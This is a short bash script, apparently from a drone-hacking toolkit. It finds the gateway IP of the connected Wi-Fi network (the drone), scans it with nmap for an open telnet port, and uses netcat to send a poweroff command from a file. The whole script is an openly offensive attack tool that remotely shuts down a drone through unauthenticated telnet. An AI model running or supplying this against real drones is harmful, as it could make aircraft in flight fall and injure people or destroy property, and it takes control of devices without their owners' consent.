#!/bin/bash

#Purpose: The goal of this script is to send a shutdown command to the current drone the
#attacker is connected to via open telnet port.

#Syntax: sudo ./shutdown.sh

INT=`cat .ints.txt | cut -d " " -f 2 `
WLAN0_LINE=`ifconfig | grep -n $INT | cut -d ':' -f 1`
IP=`ifconfig | tail -n +$WLAN0_LINE | grep "broadcast" | cut -d ' ' -f 10 | cut -d '.' -f 1-3`
IP=$IP.1

echo "Conducting nmap scan of target"
nmap $IP -p 23 -n | grep telnet > /dev/null 2>&1
RC=$?

if [ $RC -eq 0 ]
then
	nc $IP 23 < .poweroffCommand.txt > /dev/null 2>&1
	echo -e "Discovered\nshutdown successful"
else
	echo "Telnet not found, aborting..."
fi
